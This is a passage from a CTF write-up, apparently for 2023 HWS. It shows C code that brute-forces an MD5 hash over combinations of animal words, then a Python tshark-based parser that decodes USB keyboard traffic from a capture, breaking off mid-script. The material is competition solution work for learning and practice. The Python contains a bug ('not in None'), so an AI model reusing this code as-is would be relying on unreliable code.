class="number">4</span>], <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">64</span>])</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = state[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = state[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c = state[<span class="number">2</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> d = state[<span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> x[<span class="number">64</span>];</span><br><span class="line">MD5Decode(x, block, <span class="number">64</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">0</span>], <span class="number">7</span>, <span class="number">0xd76aa478</span>);</span><br><span class="line">FF(d, a, b, c, x[<span class="number">1</span>], <span class="number">12</span>, <span class="number">0xe8c7b756</span>);</span><br><span class="line">FF(c, d, a, b, x[<span class="number">2</span>], <span class="number">17</span>, <span class="number">0x242070db</span>);</span><br><span class="line">FF(b, c, d, a, x[<span class="number">3</span>], <span class="number">22</span>, <span class="number">0xc1bdceee</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">4</span>], <span class="number">7</span>, <span class="number">0xf57c0faf</span>);</span><br><span class="line">FF(d, a, b, c, x[<span class="number">5</span>], <span class="number">12</span>, <span class="number">0x4787c62a</span>);</span><br><span class="line">FF(c, d, a, b, x[<span class="number">6</span>], <span class="number">17</span>, <span class="number">0xa8304613</span>);</span><br><span class="line">FF(b, c, d, a, x[<span class="number">7</span>], <span class="number">22</span>, <span class="number">0xfd469501</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">8</span>], <span class="number">7</span>, <span class="number">0x698098d8</span>);</span><br><span class="line">FF(d, a, b, c, x[<span class="number">9</span>], <span class="number">12</span>, <span class="number">0x8b44f7af</span>);</span><br><span class="line">FF(c, d, a, b, x[<span class="number">10</span>], <span class="number">17</span>, <span class="number">0xffff5bb1</span>);</span><br><span class="line">FF(b, c, d, a, x[<span class="number">11</span>], <span class="number">22</span>, <span class="number">0x895cd7be</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">12</span>], <span class="number">7</span>, <span class="number">0x6b901122</span>);</span><br><span class="line">FF(d, a, b, c, x[<span class="number">13</span>], <span class="number">12</span>, <span class="number">0xfd987193</span>);</span><br><span class="line">FF(c, d, a, b, x[<span class="number">14</span>], <span class="number">17</span>, <span class="number">0xa679438e</span>);</span><br><span class="line">FF(b, c, d, a, x[<span class="number">15</span>], <span class="number">22</span>, <span class="number">0x49b40821</span>);</span><br><span class="line">GG(a, b, c, d, x[<span class="number">1</span>], <span class="number">5</span>, <span class="number">0xf61e2562</span>);</span><br><span class="line">GG(d, a, b, c, x[<span class="number">6</span>], <span class="number">9</span>, <span class="number">0xc040b340</span>);</span><br><span class="line">GG(c, d, a, b, x[<span class="number">11</span>], <span class="number">14</span>, <span class="number">0x265e5a51</span>);</span><br><span class="line">GG(b, c, d, a, x[<span class="number">0</span>], <span class="number">20</span>, <span class="number">0xe9b6c7aa</span>);</span><br><span class="line">GG(a, b, c, d, x[<span class="number">5</span>], <span class="number">5</span>, <span class="number">0xd62f105d</span>);</span><br><span class="line">GG(d, a, b, c, x[<span class="number">10</span>], <span class="number">9</span>, <span class="number">0x2441453</span>);</span><br><span class="line">GG(c, d, a, b, x[<span class="number">15</span>], <span class="number">14</span>, <span class="number">0xd8a1e681</span>);</span><br><span class="line">GG(b, c, d, a, x[<span class="number">4</span>], <span class="number">20</span>, <span class="number">0xe7d3fbc8</span>);</span><br><span class="line">GG(a, b, c, d, x[<span class="number">9</span>], <span class="number">5</span>, <span class="number">0x21e1cde6</span>);</span><br><span class="line">GG(d, a, b, c, x[<span class="number">14</span>], <span class="number">9</span>, <span class="number">0xc33707d6</span>);</span><br><span class="line">GG(c, d, a, b, x[<span class="number">3</span>], <span class="number">14</span>, <span class="number">0xf4d50d87</span>);</span><br><span class="line">GG(b, c, d, a, x[<span class="number">8</span>], <span class="number">20</span>, <span class="number">0x455a14ed</span>);</span><br><span class="line">GG(a, b, c, d, x[<span class="number">13</span>], <span class="number">5</span>, <span class="number">0xa9e3e905</span>);</span><br><span class="line">GG(d, a, b, c, x[<span class="number">2</span>], <span class="number">9</span>, <span class="number">0xfcefa3f8</span>);</span><br><span class="line">GG(c, d, a, b, x[<span class="number">7</span>], <span class="number">14</span>, <span class="number">0x676f02d9</span>);</span><br><span class="line">GG(b, c, d, a, x[<span class="number">12</span>], <span class="number">20</span>, <span class="number">0x8d2a4c8a</span>);</span><br><span class="line">HH(a, b, c, d, x[<span class="number">5</span>], <span class="number">4</span>, <span class="number">0xfffa3942</span>);</span><br><span class="line">HH(d, a, b, c, x[<span class="number">8</span>], <span class="number">11</span>, <span class="number">0x8771f681</span>);</span><br><span class="line">HH(c, d, a, b, x[<span class="number">11</span>], <span class="number">16</span>, <span class="number">0x6d9d6122</span>);</span><br><span class="line">HH(b, c, d, a, x[<span class="number">14</span>], <span class="number">23</span>, <span class="number">0xfde5380c</span>);</span><br><span class="line">HH(a, b, c, d, x[<span class="number">1</span>], <span class="number">4</span>, <span class="number">0xa4beea44</span>);</span><br><span class="line">HH(d, a, b, c, x[<span class="number">4</span>], <span class="number">11</span>, <span class="number">0x4bdecfa9</span>);</span><br><span class="line">HH(c, d, a, b, x[<span class="number">7</span>], <span class="number">16</span>, <span class="number">0xf6bb4b60</span>);</span><br><span class="line">HH(b, c, d, a, x[<span class="number">10</span>], <span class="number">23</span>, <span class="number">0xbebfbc70</span>);</span><br><span class="line">HH(a, b, c, d, x[<span class="number">13</span>], <span class="number">4</span>, <span class="number">0x289b7ec6</span>);</span><br><span class="line">HH(d, a, b, c, x[<span class="number">0</span>], <span class="number">11</span>, <span class="number">0xeaa127fa</span>);</span><br><span class="line">HH(c, d, a, b, x[<span class="number">3</span>], <span class="number">16</span>, <span class="number">0xd4ef3085</span>);</span><br><span class="line">HH(b, c, d, a, x[<span class="number">6</span>], <span class="number">23</span>, <span class="number">0x4881d05</span>);</span><br><span class="line">HH(a, b, c, d, x[<span class="number">9</span>], <span class="number">4</span>, <span class="number">0xd9d4d039</span>);</span><br><span class="line">HH(d, a, b, c, x[<span class="number">12</span>], <span class="number">11</span>, <span class="number">0xe6db99e5</span>);</span><br><span class="line">HH(c, d, a, b, x[<span class="number">15</span>], <span class="number">16</span>, <span class="number">0x1fa27cf8</span>);</span><br><span class="line">HH(b, c, d, a, x[<span class="number">2</span>], <span class="number">23</span>, <span class="number">0xc4ac5665</span>);</span><br><span class="line">II(a, b, c, d, x[<span class="number">0</span>], <span class="number">6</span>, <span class="number">0xf4292244</span>);</span><br><span class="line">II(d, a, b, c, x[<span class="number">7</span>], <span class="number">10</span>, <span class="number">0x432aff97</span>);</span><br><span class="line">II(c, d, a, b, x[<span class="number">14</span>], <span class="number">15</span>, <span class="number">0xab9423a7</span>);</span><br><span class="line">II(b, c, d, a, x[<span class="number">5</span>], <span class="number">21</span>, <span class="number">0xfc93a039</span>);</span><br><span class="line">II(a, b, c, d, x[<span class="number">12</span>], <span class="number">6</span>, <span class="number">0x655b59c3</span>);</span><br><span class="line">II(d, a, b, c, x[<span class="number">3</span>], <span class="number">10</span>, <span class="number">0x8f0ccc92</span>);</span><br><span class="line">II(c, d, a, b, x[<span class="number">10</span>], <span class="number">15</span>, <span class="number">0xffeff47d</span>);</span><br><span class="line">II(b, c, d, a, x[<span class="number">1</span>], <span class="number">21</span>, <span class="number">0x85845dd1</span>);</span><br><span class="line">II(a, b, c, d, x[<span class="number">8</span>], <span class="number">6</span>, <span class="number">0x6fa87e4f</span>);</span><br><span class="line">II(d, a, b, c, x[<span class="number">15</span>], <span class="number">10</span>, <span class="number">0xfe2ce6e0</span>);</span><br><span class="line">II(c, d, a, b, x[<span class="number">6</span>], <span class="number">15</span>, <span class="number">0xa3014314</span>);</span><br><span class="line">II(b, c, d, a, x[<span class="number">13</span>], <span class="number">21</span>, <span class="number">0x4e0811a1</span>);</span><br><span class="line">II(a, b, c, d, x[<span class="number">4</span>], <span class="number">6</span>, <span class="number">0xf7537e82</span>);</span><br><span class="line">II(d, a, b, c, x[<span class="number">11</span>], <span class="number">10</span>, <span class="number">0xbd3af235</span>);</span><br><span class="line">II(c, d, a, b, x[<span class="number">2</span>], <span class="number">15</span>, <span class="number">0x2ad7d2bb</span>);</span><br><span class="line">II(b, c, d, a, x[<span class="number">9</span>], <span class="number">21</span>, <span class="number">0xeb86d391</span>);</span><br><span class="line">state[<span class="number">0</span>] += a;</span><br><span class="line">state[<span class="number">1</span>] += b;</span><br><span class="line">state[<span class="number">2</span>] += c;</span><br><span class="line">state[<span class="number">3</span>] += d;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, _TCHAR* argv[])</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> encrypt[] =</span><br><span class="line"><span class="string">"catmonkeydogdragondogcatfoxpandapanda"</span>;<span class="comment">//21232f297a57a5a743894a0e4a801fc3</span></span><br><span class="line"><span class="type">char</span> my[][<span class="number">10</span>] = { <span class="string">"cat"</span>,<span class="string">"dog"</span>,<span class="string">"fox"</span>,<span class="string">"panda"</span>,<span class="string">"dragon"</span>,<span class="string">"monkey"</span> };</span><br><span class="line"><span class="type">char</span> animals[<span class="number">256</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="comment">//memset(animals, 0, sizeof(animals));</span></span><br><span class="line"><span class="comment">//051410233</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i1 = <span class="number">0</span>; i1 &lt; <span class="number">6</span>; i1++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">6</span>; i2++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">6</span>; i3++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i4 = <span class="number">0</span>; i4 &lt; <span class="number">6</span>; i4++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i5 = <span class="number">0</span>; i5 &lt; <span class="number">6</span>; i5++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i6 = <span class="number">0</span>; i6 &lt; <span class="number">6</span>; i6++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i7 = <span class="number">0</span>; i7 &lt; <span class="number">6</span>; i7++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i8 = <span class="number">0</span>; i8 &lt; <span class="number">6</span>; i8++) {</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i9 = <span class="number">0</span>; i9 &lt; <span class="number">6</span>; i9++) {</span><br><span class="line"><span class="type">char</span> mycrpyo[<span class="number">255</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i1]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i2]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i3]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i4]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i5]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i6]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i7]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i8]);</span><br><span class="line"><span class="built_in">strcat</span>(mycrpyo, my[i9]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* my =</span><br><span class="line"><span class="string">"catmonkeydogdragondogcatfoxpandapanda"</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> decrypt[<span class="number">16</span>] = { <span class="number">0</span> };</span><br><span class="line">MD5_CTX md5;</span><br><span class="line">MD5Init(&amp;md5);</span><br><span class="line">MD5Update(&amp;md5, (<span class="type">unsigned</span> <span class="type">char</span>*)mycrpyo,</span><br><span class="line"><span class="built_in">strlen</span>((<span class="type">char</span>*)mycrpyo));</span><br><span class="line">MD5Final(&amp;md5, decrypt);</span><br><span class="line"><span class="keyword">if</span> (((decrypt[<span class="number">0</span>] &amp; <span class="number">0xE9</span> | ~decrypt[<span class="number">0</span>] &amp;</span><br><span class="line"><span class="number">0x16</span>) == <span class="number">0xcb</span>) &amp;&amp; ((decrypt[<span class="number">1</span>] &amp; <span class="number">0xE9</span> | ~decrypt[<span class="number">1</span>] &amp; <span class="number">0x16</span>) == <span class="number">0xa4</span>) &amp;&amp;</span><br><span class="line">((decrypt[<span class="number">2</span>] &amp; <span class="number">0xE9</span> | ~decrypt[<span class="number">2</span>] &amp; <span class="number">0x16</span>) == <span class="number">0x7B</span>)) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d%d%d%d%d%d%d%d%d\n"</span>, i1,</span><br><span class="line">i2, i3, i4, i5, i6, i7, i8, i9);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><img src="/2023/07/20/2023HWS-WriteUp/image-20230720104609934.png" alt="image-20230720104609934" style="zoom:50%;"><h1 id="misc-usb-base85"><a href="#misc-usb-base85" class="headerlink" title="misc - usb+base85"></a>misc - usb+base85</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, argparse, os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">kbpaser</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># tshark 导出文件</span></span><br><span class="line">        self.datafile = <span class="string">"kbdatafile.txt"</span></span><br><span class="line">        self.presses = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Keyboard Traffic Dictionary</span></span><br><span class="line">        self.normalKeys = {<span class="string">"04"</span>: <span class="string">"a"</span>, <span class="string">"05"</span>: <span class="string">"b"</span>, <span class="string">"06"</span>: <span class="string">"c"</span>, <span class="string">"07"</span>: <span class="string">"d"</span>, <span class="string">"08"</span>: <span class="string">"e"</span>, <span class="string">"09"</span>: <span class="string">"f"</span>, <span class="string">"0a"</span>: <span class="string">"g"</span>, <span class="string">"0b"</span>: <span class="string">"h"</span>,</span><br><span class="line">                           <span class="string">"0c"</span>: <span class="string">"i"</span>, <span class="string">"0d"</span>: <span class="string">"j"</span>, <span class="string">"0e"</span>: <span class="string">"k"</span>, <span class="string">"0f"</span>: <span class="string">"l"</span>, <span class="string">"10"</span>: <span class="string">"m"</span>, <span class="string">"11"</span>: <span class="string">"n"</span>, <span class="string">"12"</span>: <span class="string">"o"</span>, <span class="string">"13"</span>: <span class="string">"p"</span>,</span><br><span class="line">                           <span class="string">"14"</span>: <span class="string">"q"</span>, <span class="string">"15"</span>: <span class="string">"r"</span>, <span class="string">"16"</span>: <span class="string">"s"</span>, <span class="string">"17"</span>: <span class="string">"t"</span>, <span class="string">"18"</span>: <span class="string">"u"</span>, <span class="string">"19"</span>: <span class="string">"v"</span>, <span class="string">"1a"</span>: <span class="string">"w"</span>, <span class="string">"1b"</span>: <span class="string">"x"</span>,</span><br><span class="line">                           <span class="string">"1c"</span>: <span class="string">"y"</span>, <span class="string">"1d"</span>: <span class="string">"z"</span>, <span class="string">"1e"</span>: <span class="string">"1"</span>, <span class="string">"1f"</span>: <span class="string">"2"</span>, <span class="string">"20"</span>: <span class="string">"3"</span>, <span class="string">"21"</span>: <span class="string">"4"</span>, <span class="string">"22"</span>: <span class="string">"5"</span>, <span class="string">"23"</span>: <span class="string">"6"</span>,</span><br><span class="line">                           <span class="string">"24"</span>: <span class="string">"7"</span>, <span class="string">"25"</span>: <span class="string">"8"</span>, <span class="string">"26"</span>: <span class="string">"9"</span>, <span class="string">"27"</span>: <span class="string">"0"</span>, <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>,</span><br><span class="line">                           <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"-"</span>, <span class="string">"2e"</span>: <span class="string">"="</span>, <span class="string">"2f"</span>: <span class="string">"["</span>, <span class="string">"30"</span>: <span class="string">"]"</span>, <span class="string">"31"</span>: <span class="string">"\\"</span>,</span><br><span class="line">                           <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">";"</span>, <span class="string">"34"</span>: <span class="string">"'"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">","</span>, <span class="string">"37"</span>: <span class="string">"."</span>, <span class="string">"38"</span>: <span class="string">"/"</span>,</span><br><span class="line">                           <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>,</span><br><span class="line">                           <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>, <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>,</span><br><span class="line">                           <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>}</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Press shift</span></span><br><span class="line">        self.shiftKeys = {<span class="string">"04"</span>: <span class="string">"A"</span>, <span class="string">"05"</span>: <span class="string">"B"</span>, <span class="string">"06"</span>: <span class="string">"C"</span>, <span class="string">"07"</span>: <span class="string">"D"</span>, <span class="string">"08"</span>: <span class="string">"E"</span>, <span class="string">"09"</span>: <span class="string">"F"</span>, <span class="string">"0a"</span>: <span class="string">"G"</span>, <span class="string">"0b"</span>: <span class="string">"H"</span>,</span><br><span class="line">                          <span class="string">"0c"</span>: <span class="string">"I"</span>, <span class="string">"0d"</span>: <span class="string">"J"</span>, <span class="string">"0e"</span>: <span class="string">"K"</span>, <span class="string">"0f"</span>: <span class="string">"L"</span>, <span class="string">"10"</span>: <span class="string">"M"</span>, <span class="string">"11"</span>: <span class="string">"N"</span>, <span class="string">"12"</span>: <span class="string">"O"</span>, <span class="string">"13"</span>: <span class="string">"P"</span>,</span><br><span class="line">                          <span class="string">"14"</span>: <span class="string">"Q"</span>, <span class="string">"15"</span>: <span class="string">"R"</span>, <span class="string">"16"</span>: <span class="string">"S"</span>, <span class="string">"17"</span>: <span class="string">"T"</span>, <span class="string">"18"</span>: <span class="string">"U"</span>, <span class="string">"19"</span>: <span class="string">"V"</span>, <span class="string">"1a"</span>: <span class="string">"W"</span>, <span class="string">"1b"</span>: <span class="string">"X"</span>,</span><br><span class="line">                          <span class="string">"1c"</span>: <span class="string">"Y"</span>, <span class="string">"1d"</span>: <span class="string">"Z"</span>, <span class="string">"1e"</span>: <span class="string">"!"</span>, <span class="string">"1f"</span>: <span class="string">"@"</span>, <span class="string">"20"</span>: <span class="string">"#"</span>, <span class="string">"21"</span>: <span class="string">"$"</span>, <span class="string">"22"</span>: <span class="string">"%"</span>, <span class="string">"23"</span>: <span class="string">"^"</span>,</span><br><span class="line">                          <span class="string">"24"</span>: <span class="string">"&amp;"</span>, <span class="string">"25"</span>: <span class="string">"*"</span>, <span class="string">"26"</span>: <span class="string">"("</span>, <span class="string">"27"</span>: <span class="string">")"</span>, <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>,</span><br><span class="line">                          <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"_"</span>, <span class="string">"2e"</span>: <span class="string">"+"</span>, <span class="string">"2f"</span>: <span class="string">"{"</span>, <span class="string">"30"</span>: <span class="string">"}"</span>, <span class="string">"31"</span>: <span class="string">"|"</span>,</span><br><span class="line">                          <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">"\""</span>, <span class="string">"34"</span>: <span class="string">":"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">"&lt;"</span>, <span class="string">"37"</span>: <span class="string">"&gt;"</span>, <span class="string">"38"</span>: <span class="string">"?"</span>,</span><br><span class="line">                          <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>,</span><br><span class="line">                          <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>, <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>,</span><br><span class="line">                          <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tshark_do</span>(<span class="params">self, pcapfile, filterfield, fieldvalue</span>):</span><br><span class="line">        <span class="keyword">if</span> os.name == <span class="string">"nt"</span>:</span><br><span class="line">            <span class="keyword">if</span> filterfield <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                command = <span class="string">f"tshark -r <span class="subst">{pcapfile}</span> -Y <span class="subst">{filterfield}</span> -T fields -e <span class="subst">{fieldvalue}</span> &gt; <span class="subst">{self.datafile}</span>"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                command = <span class="string">f"tshark -r <span class="subst">{pcapfile}</span> -T fields -e <span class="subst">{fieldvalue}</span> &gt; <span class="subst">{self.datafile}</span>"</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.system(command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"tshark执行语句："</span> + command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[+] Found : tshark导出数据成功"</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"tshark执行语句："</span> + command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[+] Found : tshark导出数据失败"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> os.name == <span class="string">"posix"</span>:</span><br><span class="line">            <span class="comment"># sed '/^\s*$/d' 主要是去掉空行</span></span><br><span class="line">            <span class="keyword">if</span> filterfield <span class="keyword">not</span> <span class="keyword">in</span> <span class="literal">None</span>:</span><br><span class="line">                command = <span class="string">f"tshark -r <span class="subst">{pcapfile}</span> -Y <span class="subst">{filterfield}</span> -T fields -e <span class="subst">{fieldvalue}</span> | sed '/^\s*$/d' &gt; <span class="subst">{self.datafile}</span>"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                command = <span class="string">f"tshark -r <span class="subst">{pcapfile}</span> -T fields -e <span class="subst">{fieldvalue}</span> | sed '/^\s*$/d' &gt; <span class="subst">{self.datafile}</span>"</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.system(command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"tshark执行语句："</span> + command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[+] Found : tshark导出数据成功"</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"tshark执行语句："</span> + command)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[+] Found : tshark导出数据失败"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 筛掉无用数据，改变数据格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">formatkbdata</span>(<span class="params">self</span>):</span><br><span class="line">        formatfile = <span class="built_in">open</span>(<span class="string">"formatKbdatafile.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.datafile, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">                <span class="comment"># if len(i.strip("\n")) == 8:</span></span><br><span class="line">                <span class="comment">#     Bytes = [i[j:j+2] for j in range(0, len(i.strip("\n")), 2)]</span></span><br><span class="line">                <span class="comment">#     data = ":".join(Bytes)</span></span><br><span 